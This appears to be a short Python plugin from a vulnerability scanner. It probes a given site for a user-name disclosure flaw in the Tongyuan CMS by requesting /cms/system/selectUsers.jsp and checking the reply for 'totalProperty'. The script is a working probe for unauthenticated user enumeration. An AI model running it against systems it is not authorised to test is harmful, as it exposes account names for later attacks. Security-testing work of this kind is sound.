#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 通元建站系统用户名泄露漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-059578
author: Lucifer
description: 未做权限过滤，可以显示所有用户的用户名
'''
import sys
import requests
import warnings
def run(url):
        result = ['通元建站系统用户名泄露漏洞','','']
        payload = "/cms/system/selectUsers.jsp"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False)

            if r"totalProperty" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    